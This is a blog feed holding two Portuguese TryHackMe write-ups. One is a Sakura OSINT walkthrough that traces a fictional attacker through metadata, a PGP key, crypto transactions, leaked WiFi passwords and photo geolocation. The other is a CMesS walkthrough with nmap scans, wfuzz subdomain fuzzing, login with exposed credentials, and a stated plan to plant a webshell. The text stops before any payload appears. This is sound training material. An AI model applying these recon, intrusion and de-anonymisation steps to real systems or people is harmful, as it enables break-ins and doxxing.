@@ -1,0 +1,708 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="pt-br"><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://rbbck.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://rbbck.github.io/" rel="alternate" type="text/html" hreflang="pt-br" /><updated>2022-07-03T07:47:15+00:00</updated><id>https://rbbck.github.io/feed.xml</id><title type="html">Rubick Blog</title><subtitle>Rubick Blog</subtitle><author><name>Rubick</name></author><entry xml:lang="pt-br"><title type="html">TryHackMe Sakura Room</title><link href="https://rbbck.github.io/writeup/2022/06/24/thm_sakura_room/" rel="alternate" type="text/html" title="TryHackMe Sakura Room" /><published>2022-06-24T00:00:00+00:00</published><updated>2022-06-24T00:00:00+00:00</updated><id>https://rbbck.github.io/writeup/2022/06/24/thm_sakura_room</id><content type="html" xml:base="https://rbbck.github.io/writeup/2022/06/24/thm_sakura_room/"><![CDATA[<p><img src="/assets/Pasted image 20220627235902.png" alt="" /></p>
+
+<h1 id="primeiros-passos">Primeiros passos</h1>
+<p>Esta room é pensada para testar uma variedade de técnicas de <strong>OSINT</strong><sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup>, vamos experienciar um exemplo de <strong>investigação</strong> que visa <strong>achar alguns identificadores</strong> e outros <strong>pedaços de informações</strong> afim de capturar um cibercriminoso.</p>
+
+<blockquote>
+  <p>NOTE: All answers can be obtained via passive OSINT techniques, DO NOT attempt any active techniques such as reaching out to account owners, password resets, etc to solve these challenges.</p>
+</blockquote>
+
+<p>Também somos avisados de que nenhum <strong>OSINT ativo</strong> será necessário. Veja a seguir <strong>alguns</strong> exemplos para distingui-los:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>OSINT Passivo</th>
+      <th>OSINT Ativo</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Não faz contato direto</td>
+      <td>Pode ocorrer contato entre os lados</td>
+    </tr>
+    <tr>
+      <td>Scans passivos, mais oculto</td>
+      <td>Postura mais agressiva e intrusiva, maior risco de detecção</td>
+    </tr>
+    <tr>
+      <td>Juntar informações disponíveis hospedadas em terceiros</td>
+      <td>Engenharia social, ex: enviar um link malicioso para vítima</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h1 id="primeira-flag">Primeira flag</h1>
+<blockquote>
+  <p>What username does the attacker go by?</p>
+</blockquote>
+
+<p>Nos é pedido o <strong>nome de usuário</strong> do criminoso. Além disso, é fornecido um panorama:</p>
+<blockquote>
+  <p>O <a href="https://www.osintdojo.com">OSINT Dojo</a> foi vítima de um ciberataque e durante análises forenses, foi encontrada uma imagem deixada para trás pelo autor do crime. Quem sabe ela contém alguma pista que nos permitiria apontar uma direção?</p>
+</blockquote>
+
+<p><img src="/assets/Pasted image 20220628011354.png" alt="" /></p>
+
+<p>Com isso temos nosso ponto de partida. Em uma imagem podem haver inúmeras informações escondidas, seja porque <a href="https://www.gta.ufrj.br/ensino/eel878/redes1-2016-1/16_1/esteganografia/">alguém escondeu</a>  lá, ou, como no nosso caso, porque alguém <strong>esqueceu de checar o próprio rastro</strong>. O <strong><em>Exchangeable image file format</em></strong> ou simplesmente <strong>EXIF</strong> é um <strong>padrão para armazenar informações na fotografia digital</strong>. Resumidamente, é um conjunto de informações sobre (e contidas em) uma imagem, tais como sua <strong>resolução</strong>, <strong>data de modificação</strong>, <strong>fabricante da câmera</strong>, etc. Em alguns casos, pode conter até mesmo dados de <strong>geolocalização</strong>.</p>
+
+<p>Iremos utilizar a ferramenta <a href="https://exiftool.org/">ExifTool</a>, que serve para ler, gravar e editar <strong>metadados</strong>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exiftool sakurapwnedletter.svg
+ExifTool Version Number         : 12.42  
+File Name                       : sakurapwnedletter.svg  
+Directory                       : .  
+File Size                       : 850 kB  
+File Modification Date/Time     : 2022:06:28 01:28:26-03:00  
+File Access Date/Time           : 2022:06:28 01:28:26-03:00  
+File Inode Change Date/Time     : 2022:06:28 01:28:26-03:00  
+File Permissions                : -rw-r--r--  
+File Type                       : SVG  
+File Type Extension             : svg  
+MIME Type                       : image/svg+xml  
+Xmlns                           : http://www.w3.org/2000/svg  
+Image Width                     : 116.29175mm  
+Image Height                    : 174.61578mm  
+View Box                        : 0 0 116.29175 174.61578  
+SVG Version                     : 1.1  
+ID                              : svg8  
+Version                         : 0.92.5 (2060ec1f9f, 2020-04-08)  
+Docname                         : pwnedletter.svg  
+Export-filename                 : /home/SakuraSnowAngelAiko/Desktop/pwnedletter.png  
+Export-xdpi                     : 96  
+Export-ydpi                     : 96  
+Metadata ID                     : metadata5  
+Work Format                     : image/svg+xml  
+Work Type                       : http://purl.org/dc/dcmitype/StillImage  
+Work Title                      :
+</code></pre></div></div>
+
+<p>Temos inúmeras saídas aqui, mas vamos focar em uma específica. <strong>Export-filename</strong> possui como valor o caminho do arquivo na hora de sua exportação:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Export-filename                 : /home/SakuraSnowAngelAiko/Desktop/pwnedletter.png
+</code></pre></div></div>
+<p>E com isso descobrimos o nome de usuário do nosso atacante.</p>
+
+<hr />
+
+<h1 id="segunda-flag">Segunda flag</h1>
+<blockquote>
+  <p>What is the full email address used by the attacker?</p>
+</blockquote>
+
+<p>Para o <strong>email do atacante</strong>, tanto é válido utilizar uma ferramenta automatizada quanto ir diretamente nos sites e redes sociais mais conhecidos e inserir o nome de usuário que encontramos antes, ou seja, uma <strong>abordagem manual</strong>.</p>
+
+<p>Uma <strong>ótima ferramenta</strong> é o <a href="https://github.com/sherlock-project/sherlock">Sherlock</a>, escrita em <strong>Python</strong>, que fornecido um nome de usuário, o software irá atrás dele por diversos locais na internet.</p>
+
+<p>Exemplo de utilização:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 sherlock.py --verbose SakuraSnowAngelAiko
+
+[*] Checking username SakuraSnowAngelAiko on:  
+  
+  
+[+] [5058ms] GitHub: https://www.github.com/SakuraSnowAngelAiko  
+[+] [11563ms] Reddit: https://www.reddit.com/user/SakuraSnowAngelAiko
+[...]
+</code></pre></div></div>
+
+<p>Uma das saídas é o <strong>GitHub</strong> dele, o que nos é muitíssimo interessante:</p>
+
+<p><img src="/assets/Pasted image 20220628232728.png" alt="" /></p>
+
+<p>Estes são os <strong>repositórios fixados</strong> do nosso atacante:</p>
+
+<p><img src="/assets/Pasted image 20220628233553.png" alt="" /></p>
+
+<p>Um destaque especial para o repositório <strong>PGP</strong><sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup>, onde o invasor compartilha sua <strong>chave pública</strong><sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup>.</p>
+
+<p><img src="/assets/Pasted image 20220629014758.png" alt="" /></p>
+
+<p>Se baixarmos a chave, rodarmos o <a href="https://gnupg.org/">gnu</a> <strong>sem fornecer nenhum parâmetro</strong>, passando a <strong>publickey que baixamos</strong>, o programa vai “<strong>printar</strong>” a chave:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/sakurasnowangelaiko/PGP/blob/main/publickey
+gpg publickey
+
+gpg: WARNING: no command supplied.  Trying to guess what you mean ...  
+pub   rsa3072 2021-01-23 [SC] [expires: 2023-01-22]  
+     A6519F273BF88E9126B0F4C5ECDD0FD294110450  
+uid           SakuraSnowAngel83@protonmail.com  
+sub   rsa3072 2021-01-23 [E] [expires: 2023-01-22]
+</code></pre></div></div>
+
+<p>Revelando o <strong>email de nosso ciberpirata</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid           SakuraSnowAngel83@protonmail.com  
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="terceira-flag">Terceira flag</h1>
+<blockquote>
+  <p>What is the attacker’s full real name?</p>
+</blockquote>
+
+<p>Essa foi mamão com açúcar! Jogando o <strong>nickname</strong> do GitHub no Google, <strong>nosso primeiro resultado já nos dá a resposta</strong>, <strong>seu nome</strong>:</p>
+
+<p><img src="/assets/Pasted image 20220629030444.png" alt="" /></p>
+
+<p><img src="/assets/Pasted image 20220629030620.png" alt="" /></p>
+
+<hr />
+
+<h1 id="quarta-flag">Quarta flag</h1>
+<blockquote>
+  <p>What cryptocurrency does the attacker own a cryptocurrency wallet for?</p>
+</blockquote>
+
+<p>Nosso objetivo agora é descobrir qual <strong>criptomoeda</strong> o Aiko movimenta. Vocês lembram dos repositórios de nosso <em>software engineer</em>?</p>
+
+<p>Se reparar, os fixados somam apenas <strong>cinco</strong>, quando na realidade ele tem <strong>nove</strong>:</p>
+
+<p><img src="/assets/Pasted image 20220629032530.png" alt="" /></p>
+
+<p>Sendo um deles chamado “ETH”, acrônimo para “<a href="https://ethereum.org/en/">Ethereum</a>”, uma das <strong>criptomoedas</strong> mais famosas:</p>
+
+<p><img src="/assets/Pasted image 20220629032858.png" alt="" /></p>
+
+<p>Inserindo <strong>ETH</strong> no TryHackMe, a resposta foi aceita, todavia, outros repositórios podem indicar que ele também utilizaria <strong>Litecoin</strong> e <strong>Bitcoin</strong>.</p>
+
+<hr />
+
+<h1 id="quinta-flag">Quinta flag</h1>
+<blockquote>
+  <p>What is the attacker’s cryptocurrency wallet address?</p>
+</blockquote>
+
+<p>Para encontrar o <strong>endereço da carteira</strong> do hacker, precisaremos voltar no tempo.
+Mas calma, que não precisaremos do <strong>DeLorean</strong> não!</p>
+
+<p>Dêem uma olhada na página do repositório <strong>ETH</strong>:</p>
+
+<p><img src="/assets/Pasted image 20220629033224.png" alt="" /></p>
+
+<p>Nota-se que <strong>dois</strong> <strong><em>commits</em></strong> foram feitos. Vamos ver o que foi alterado? Clicando no reloginho vemos:</p>
+
+<p><img src="/assets/Pasted image 20220629033630.png" alt="" /></p>
+
+<p>E ao clicar para ver o <em>commit</em> “Update miningscript”:</p>
+
+<p><img src="/assets/Pasted image 20220629033717.png" alt="" /></p>
+
+<p>É isso mesmo! O <strong>endereço de sua carteira digital</strong> sendo ocultada.</p>
+
+<hr />
+
+<h1 id="sexta-flag">Sexta flag</h1>
+<blockquote>
+  <p>What mining pool did the attacker receive payments from on January 23, 2021 UTC?</p>
+</blockquote>
+
+<p>Inserindo a nossa <strong>flag anterior</strong> no <a href="https://etherscan.io/">Etherscan</a>:</p>
+
+<p><img src="/assets/Pasted image 20220629034349.png" alt="" /></p>
+
+<p>Descobrimos que de fato a carteira existe:</p>
+
+<p><img src="/assets/Pasted image 20220629034431.png" alt="" /></p>
+
+<p>Agora só precisamos ir até as <strong>transações da carteira</strong> e procurar <strong>quem efetuou pagamentos</strong> para este destino <strong>no dia 23 de Janeiro de 2021</strong> como pede a flag:</p>
+
+<p><img src="/assets/Pasted image 20220629034918.png" alt="" />
+Desvendamos mais esta! O remetente desta transação foi “<strong>Ethermine</strong>”.</p>
+
+<hr />
+
+<h1 id="sétima-flag">Sétima flag</h1>
+<blockquote>
+  <p>What other cryptocurrency did the attacker exchange with using their cryptocurrency wallet?</p>
+</blockquote>
+
+<p>Qual outra <strong>criptomoeda</strong> o nosso alvo utilizou?
+Ainda na página das transações nós encontramos esta resposta:</p>
+
+<p><img src="/assets/Pasted image 20220629040200.png" alt="" /></p>
+
+<p><strong>Tether</strong>! Uma <strong>criptomoeda</strong> que se compromete a ter uma proporção 1:1 em sua cotação com o <strong>dólar estadunidense</strong></p>
+
+<h1 id="oitava-flag">Oitava flag</h1>
+<blockquote>
+  <p>What is the attacker’s current Twitter handle?</p>
+</blockquote>
+
+<p>Para achar o <em>nome de usuário</em> do Twitter de nosso invasor, as seguintes informações são fornecidas:</p>
+
+<blockquote>
+  <p>“Como haviamos pensado, o cibercriminoso está completamente ciente de que estamos colentando informações sobre ele após o ataque. Ele ainda foi descarado de citar o OSINT Dojo no Twitter e nos provocar por nossos esforços. A conta que foi usada possui um nome diferente do que estávamos rastreando anteriormente, quem sabe há alguma informação adicional para termos alguma ideia de para onde ir?</p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/OsintDojo/public/main/taunt.png" alt="" /></p>
+
+<p>Jogando este novo nome de usuário em qualquer buscador deve nos retornar a conta <strong>@SakuraLoverAiko</strong></p>
+
+<p>Nessa conta, há um tweet explicitando “Olá! Eu sou <strong>@AikoAbe3!</strong>”</p>
+
+<p><img src="/assets/Pasted image 20220630212419.png" alt="" /></p>
+
+<hr />
+
+<h1 id="nona-flag">Nona flag</h1>
+<blockquote>
+  <p>What is the URL for the location where the attacker saved their WiFi  SSIDs and passwords?</p>
+</blockquote>
+
+<p>Esta flag admito que achei inesperada mas interessante.
+Analisando a última conta do Twitter que encontramos, somos capazes de achar um tweet <strong>nada suspeito</strong>:</p>
+
+<p><img src="/assets/Pasted image 20220630212522.png" alt="" /></p>
+
+<p>Okay dokey. Então sabemos que o nosso atacante (por algum motivo) <strong>postou suas senhas de acesso WiFi em algum lugar</strong>.
+Outro ponto que nos facilita bastante é que o <strong>ID do post está completo</strong>. Só falta saber <strong>onde</strong> esta lista foi hospedada.</p>
+
+<p>Logo em sequência à este tweet, o Aiko responde:</p>
+
+<p><img src="/assets/Pasted image 20220630213801.png" alt="" /></p>
+
+<p>O tweet cita “<strong>Dark Web</strong>” e “<strong>Deep Paste</strong>” (em caixa alta, ficou até cômico). Então sabemos que o nosso site se encontra na <a href="https://www.torproject.org/">rede Onion</a>. 
+A questão aqui se torna agora <strong>COMO</strong> achar este endereço, considerando que <strong>indexar</strong> páginas nessas redes alternativas sempre exige um trâmite.</p>
+
+<p>Ao achar (no Google, ou num DuckDuckGo da vida) algum site que liste endereços famosos .onion, achar o do DeepPaste se torna fácil (<a href="https://support.torproject.org/onionservices/v2-deprecation/">o endereço v3</a>).</p>
+
+<blockquote>
+  <p>Pode ocorrer do Deep Paste estar offline no momento em que estiver trabalhando nesta room. Por isso, o TryHackMe disponibiliza o endereço na dica</p>
+</blockquote>
+
+<p><img src="/assets/Pasted image 20220701192938.png" alt="" /></p>
+
+<p>Depois de encontrá-lo, basta inserir o ID do post no campo de pesquisa e a página irá mostrar. Nele, alguns <strong>SSIDs</strong> e algumas <strong>senhas</strong> foram armazenadas.</p>
+
+<p><img src="/assets/Pasted image 20220701193518.png" alt="" /></p>
+
+<hr />
+
+<h1 id="décima-flag">Décima flag</h1>
+
+<blockquote>
+  <p>What is the BSSID for the attacker’s Home WiFi?</p>
+</blockquote>
+
+<p>Para achar o BSSID<sup id="fnref:4" role="doc-noteref"><a href="#fn:4" class="footnote" rel="footnote">4</a></sup>, será preciso uma conta no <a href="https://wigle.net/">wigle</a> para utilizar a função de pesquisa avançada.</p>
+
+<p>Com a pesquisa simples, só conseguimos ter noção da geolocalização do BSSID, não seu identificador:</p>
+
+<p><img src="/assets/Pasted image 20220703005717.png" alt="" /></p>
+
+<p>Já com a pesquisa avançada:</p>
+
+<p><img src="/assets/Pasted image 20220703010734.png" alt="" /></p>
+
+<p><img src="/assets/Pasted image 20220703010722.png" alt="" /></p>
+
+<hr />
+
+<h1 id="décima-primeira-flag">Décima primeira flag</h1>
+
+<blockquote>
+  <p>What airport is closest to the location the attacker shared a photo from prior to getting on their flight?</p>
+</blockquote>
+
+<p>Dando uma olhada pelo Twitter dele, encontramos isto:</p>
+
+<p><img src="/assets/Pasted image 20220701194313.png" alt="" /></p>
+
+<p>Até o momento, admito não ser bom em <strong>IMINT</strong><sup id="fnref:5" role="doc-noteref"><a href="#fn:5" class="footnote" rel="footnote">5</a></sup>, fui pego nesta parte, o que me motivou a querer fazer a <a href="https://tryhackme.com/room/searchlightosint">room Searchlight - IMINT</a>, aprender e explorar mais desta área. Tampouco conhecia alguma ferramenta, então tive de recorrer à ajuda de outros. Todavia tentarei ilustrar de forma que todos nós consigamos <strong>aprender!</strong></p>
+
+<p>Na imagem é possível ver um <strong>obelisco</strong> beeem lá longe no centro da imagem:</p>
+
+<p><img src="/assets/Pasted image 20220703012352.png" alt="" /></p>
+
+<p>Imagino que para os <strong>estadunidenses</strong> seja algo muito identificável só de bater o olho, pra mim foi impossível. Fiquei cerca de meia hora procurando por lugares perto da costa do Japão, ainda sem ter feito a conexão de que o nosso invasor estava viajando não por terras nipônicas, mas sim em <strong>outro país</strong>.</p>
+
+<p>O obelisco se trata do <strong>Monumento de Washington</strong>:</p>
+
+<p><img src="/assets/Pasted image 20220703012933.png" alt="" /></p>
+
+<p>Depois, procuramos por aeroportos que são próximos ao monumento:</p>
+
+<p><img src="/assets/Pasted image 20220703020423.png" alt="" /></p>
+
+<p>O mais próximo é o <em>Ronald Reagan Washington National Airport</em>. O formato desta flag são três caracteres, então o utilizado aqui será o código de aeroporto.</p>
+
+<p><img src="/assets/Pasted image 20220703020833.png" alt="" /></p>
+
+<hr />
+
+<h1 id="décima-primeira-flag-1">Décima primeira flag</h1>
+
+<blockquote>
+  <p>What airport did the attacker have their last layover in?</p>
+</blockquote>
+
+<p><img src="/assets/Pasted image 20220703021109.png" alt="" /></p>
+
+<p>Busca reversa pela imagem:</p>
+
+<p><img src="/assets/Pasted image 20220703021723.png" alt="" /></p>
+
+<p>Vemos já no segundo resultado “<strong>Tokyo International Airport [Haneda]</strong>”.</p>
+
+<p>E então basta ir atrás do código de 3 dígitos:</p>
+
+<p><img src="/assets/Pasted image 20220703022808.png" alt="" /></p>
+
+<hr />
+
+<h1 id="décima-segunda-flag">Décima segunda flag</h1>
+<blockquote>
+  <p>What lake can be seen in the map shared by the attacker as they were on their final flight home?</p>
+</blockquote>
+
+<p>Também do Twitter:</p>
+
+<p><img src="/assets/Pasted image 20220703022955.png" alt="" /></p>
+
+<p>Basta utilizar um mapa e ir atrás, é bem fácil achar o local no Japão se orientando pelas ilhas ao noroeste. Com facilidade conseguimos esta, já que está na ponta de nossos narizes:</p>
+
+<p><img src="/assets/Pasted image 20220703023300.png" alt="" /></p>
+
+<p><img src="/assets/Pasted image 20220703023357.png" alt="" /></p>
+
+<p><img src="/assets/Pasted image 20220703023333.png" alt="" /></p>
+
+<h1 id="décima-terceira-flag">Décima terceira flag</h1>
+<blockquote>
+  <p>What city does the attacker likely consider “home”?</p>
+</blockquote>
+
+<p><strong>Duas</strong> vias são possíveis para esta flag:</p>
+<ul>
+  <li>Ver em <strong>qual cidade</strong> aquele <strong>BSSID que colocamos no Wigle anteriormente</strong> se encontra</li>
+  <li>Usar o <strong>SSID</strong> do <strong>WiFi da cidade de Aiko</strong> que consta no Deep Paste</li>
+</ul>
+
+<hr />
+
+<h1 id="notas-de-rodapé">Notas de rodapé</h1>
+
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:1" role="doc-endnote">
+      <p><em>Open Source Intelligence</em> <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:2" role="doc-endnote">
+      <p><em>Pretty Good Privacy</em> <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:3" role="doc-endnote">
+      <p>Ler sobre <a href="https://pt.wikipedia.org/wiki/Criptografia_de_chave_p%C3%BAblica">criptografia de chave pública</a>. <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:4" role="doc-endnote">
+      <p><em>Basic Service Set Identifier</em>; Geralmente se refere ao endereço MAC, isto é, um identificador único, de um adaptador ou de um ponto de acesso ou uma derivação. Referência: <a href="https://www.quora.com/What-is-the-difference-between-SSID-BSSID-and-MAC-addresses">https://www.quora.com/What-is-the-difference-between-SSID-BSSID-and-MAC-addresses</a> <a href="#fnref:4" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:5" role="doc-endnote">
+      <p><em>Imagery Intelligence</em>; “Das três fontes de informações mais utilizadas na área de  inteligência, a chamada área de inteligência de imagens, ou imint (imagery intelligence), é a mais recente. […] o desenvolvimento de imint como uma disciplina especializada de coleta de informações deu-se fundamentalmente a partir da associação entre o uso de câmerasfotográficas e plataformas aero-espaciais.” CEPIK, Marco. Serviços de Inteligência: Agilidade e Transparência como Dilemas de Institucionalização. Tese (Doutorado em Ciência Política) – Instituto Universitário de Pesquisas do Rio de Janeiro. Rio de Janeiro, p. 310. 2001. Disponível em: <a href="https://www2.mppa.mp.br/sistemas/gcsubsites/upload/60/Servi%C3%83%C2%A7os%20de%20Intelig%C3%83%C2%AAncia.pdf">https://www2.mppa.mp.br/sistemas/gcsubsites/upload/60/Servi%C3%83%C2%A7os%20de%20Intelig%C3%83%C2%AAncia.pdf</a> <a href="#fnref:5" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+  </ol>
+</div>]]></content><author><name>Rubick</name></author><category term="writeup" /><summary type="html"><![CDATA[]]></summary></entry><entry xml:lang="pt-br"><title type="html">TryHackMe CMesS Room</title><link href="https://rbbck.github.io/writeup/2022/05/20/thm_cmess/" rel="alternate" type="text/html" title="TryHackMe CMesS Room" /><published>2022-05-20T00:00:00+00:00</published><updated>2022-05-20T00:00:00+00:00</updated><id>https://rbbck.github.io/writeup/2022/05/20/thm_cmess</id><content type="html" xml:base="https://rbbck.github.io/writeup/2022/05/20/thm_cmess/"><![CDATA[<p><img src="https://user-images.githubusercontent.com/77530544/171437979-f426c564-871e-40fd-bd56-910690e688b6.png" alt="Pasted image 20220601071802" /></p>
+
+<h1 id="primeiros-passos">Primeiros passos</h1>
+<p>É pedido que adicionemos o <strong>IP da máquina</strong> ao nosso arquivo <strong>/etc/hosts</strong>:</p>
+
+<blockquote>
+  <p>Please add <code class="language-plaintext highlighter-rouge">MACHINE_IP cmess.thm</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>
+Please also note that this box does not require brute forcing!</p>
+</blockquote>
+
+<p>Depois de adicionado, hora de rodar o <strong>Nmap</strong> para fins de reconhecimento:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sC -sV cmess.thm                                                                     
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 07:48 -03  
+Nmap scan report for cmess.thm (10.10.215.52)  
+Host is up (0.22s latency).  
+Not shown: 998 closed tcp ports (reset)  
+PORT   STATE SERVICE VERSION  
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)  
+| ssh-hostkey:    
+|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)  
+|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)  
+|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)  
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))  
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).  
+| http-robots.txt: 3 disallowed entries    
+|_/src/ /themes/ /lib/  
+|_http-generator: Gila CMS  
+|_http-server-header: Apache/2.4.18 (Ubuntu)  
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
+  
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds
+</code></pre></div></div>
+
+<p>Descobrimos dois serviços, um <strong>SSH na porta 22</strong> e um <strong>servidor Apache na porta 80</strong> com <a href="https://gilacms.com/">Gila CMS</a>.</p>
+
+<p>Ao visitar o endereço <strong>cmess.thm</strong> somos recebidos com a página:</p>
+
+<p><img src="https://user-images.githubusercontent.com/77530544/171438994-b5cfac57-add4-4fb1-a8ad-1931043a18c7.png" alt="Pasted image 20220601075329" /></p>
+
+<hr />
+
+<h1 id="primeira-flag">Primeira flag</h1>
+<blockquote>
+  <p>Compromise this machine and obtain <code class="language-plaintext highlighter-rouge">user.txt</code> <br />
+<code class="language-plaintext highlighter-rouge">Hint:</code> Have you tried fuzzing for subdomains?</p>
+</blockquote>
+
+<p>Esta dica é um ótimo ponto de partida. A partir disso, vamos efetuar um <strong>fuzzing atrás de subdiretórios</strong>, e em seguida, de <strong>subdomínios</strong>.</p>
+
+<p>Utilizaremos <a href="https://github.com/3ndG4me/KaliLists/blob/master/dirb/small.txt">esta wordlist</a> para efetuar os testes com a ferramenta <a href="https://github.com/xmendez/wfuzz">wfuzz</a>.</p>
+
+<h3 id="fuzzing-de-subdiretórios">Fuzzing de subdiretórios</h3>
+<p>Com os parâmetros:</p>
+<ul>
+  <li><strong>-w</strong> - wordlist</li>
+  <li><strong>-u</strong> - como agora estamos atrás de subdiretórios, a palavra “FUZZ” que indica ao software onde inserir o texto, será no final do endereço</li>
+  <li><strong>-c</strong> - output com cores</li>
+  <li><strong>–sc 200</strong> - opção para somente mostrar os resultados de <strong>códigos de status HTTP 200</strong></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -w wordlist.txt -u http://cmess.thm/FUZZ -c --sc 200                                                                   
+********************************************************  
+* Wfuzz 3.1.0 - The Web Fuzzer                         *  
+********************************************************  
+  
+Target: http://cmess.thm/FUZZ  
+Total requests: 959  
+  
+=====================================================================  
+ID           Response   Lines    Word       Chars       Payload                                                                                                 
+=====================================================================  
+  
+000000006:   200        102 L    308 W      4078 Ch     "1"                                                                                                     
+000000001:   200        107 L    290 W      3851 Ch     "0"                                                                                                     
+000000003:   200        102 L    308 W      4078 Ch     "01"                                                                                                    
+000000049:   200        92 L     266 W      3353 Ch     "about"                                                                                                 
+000000059:   200        41 L     99 W       1580 Ch     "admin"                                                                                                 
+000000083:   200        0 L      0 W        0 Ch        "api"                                                                                                   
+000000133:   200        107 L    290 W      3851 Ch     "blog"                                                                                                  
+000000434:   200        107 L    290 W      3851 Ch     "index"                                                                                                 
+000000498:   200        41 L     99 W       1580 Ch     "login"                                                                                                 
+000000722:   200        107 L    290 W      3851 Ch     "search"                                                                                                
+000000818:   200        109 L    292 W      3874 Ch     "tag"                                                                                                   
+  
+Total time: 21.13536  
+Processed Requests: 959  
+Filtered Requests: 948  
+Requests/sec.: 45.37419
+</code></pre></div></div>
+
+<p>Com este resultado, podemos dar destaque a <strong>login</strong> e <strong>admin</strong>.</p>
+
+<p>Ao visitar o endereço cmess.thm/login:</p>
+
+<p><img src="https://user-images.githubusercontent.com/77530544/171439377-edc7256b-b905-4868-abb9-8abbbeca65b2.png" alt="Pasted image 20220601085847" /></p>
+
+<p>Sobre a página <strong>admin</strong>, como não estamos logados, o website nos retorna à página de login.</p>
+
+<h3 id="fuzzing-de-subdomínios">Fuzzing de subdomínios:</h3>
+<p>Com relação aos <strong>parâmetros</strong>:</p>
+<ul>
+  <li><strong>-u</strong> - como agora estamos atrás de subdomínios, a palavra “FUZZ” que indica ao software onde inserir o texto vai sumir pois vamos definir isso em outro parâmetro</li>
+  <li><strong>-H “Host: FUZZ.cmess.thm”</strong> - especificando que o fuzzing será no início do endereço, atrás de subdomínios</li>
+  <li><strong>–hw 290</strong> - limpar a saída, escondendo falsos positivos, pois, dependendo de como o website é configurado, a página irá sim retornar um código 200, porém mostrando somente um erro de “Não Encontrado”</li>
+  <li><strong>–hc 400</strong> - também para limpar a saída, escondendo erros de “Bad Request”</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -w wordlist.txt -H "Host: FUZZ.cmess.thm" -u http://cmess.thm/ -c --hw 290 --hc 400 
+
+********************************************************  
+* Wfuzz 3.1.0 - The Web Fuzzer                         *  
+********************************************************  
+  
+Target: http://cmess.thm/  
+Total requests: 959  
+  
+=====================================================================  
+ID           Response   Lines    Word       Chars       Payload                                                                                                 
+=====================================================================  
+  
+000000270:   200        30 L     104 W      934 Ch      "dev"                                                                                                   
+  
+Total time: 21.96167  
+Processed Requests: 959  
+Filtered Requests: 958  
+Requests/sec.: 43.66697
+</code></pre></div></div>
+
+<p>A saída nos diz que existe um <strong>dev.cmess.thm</strong>, o qual vamos adicionar no nosso <strong>/etc/hosts</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.215.52 cmess.thm dev.cmess.thm
+</code></pre></div></div>
+
+<p>Ao visitar o endereço, vemos um log com credenciais expostas:</p>
+
+<p><img src="https://user-images.githubusercontent.com/77530544/171439403-c0bd8957-7c1f-4b35-a477-d25a12c73c76.png" alt="Pasted image 20220601092555" /></p>
+
+<p>Logando:</p>
+
+<p><img src="https://user-images.githubusercontent.com/77530544/171439418-ddf03baf-9cd4-4823-af0e-946d09154ba0.png" alt="Pasted image 20220601092834" /></p>
+
+<p>Agora temos acesso à pagina <strong>admin</strong>:</p>
+
+<p><img src="https://user-images.githubusercontent.com/77530544/171439487-a50b88ec-319c-48d9-9e2a-182efb121d6e.png" alt="Pasted image 20220601092914" /></p>
+
+<p>Com isso, conseguimos saber a versão do <strong>Gila CMS</strong>: 1.10.9
+Obtivemos acesso à um painel de admin, com direito até a um <strong>File Manager</strong> com <strong>adição</strong>, <strong>remoção</strong> e <strong>update</strong> de arquivos:</p>
+
+<p><img src="https://user-images.githubusercontent.com/77530544/171439692-5778287d-fc1d-4c79-8f74-a2f8fb19dd8e.png" alt="Pasted image 20220601093523" />
+<img src="https://user-images.githubusercontent.com/77530544/171439723-f4b9376a-1d7a-48ec-9240-647f39d01e6b.png" alt="Pasted image 20220601093640" /></p>
+
+<p>Iremos modificar o arquivo <strong>/themes/gila-blog/header.php</strong> atrás de obter um <strong>reverse shell</strong> através de um <strong>webshell</strong>:</p>
+
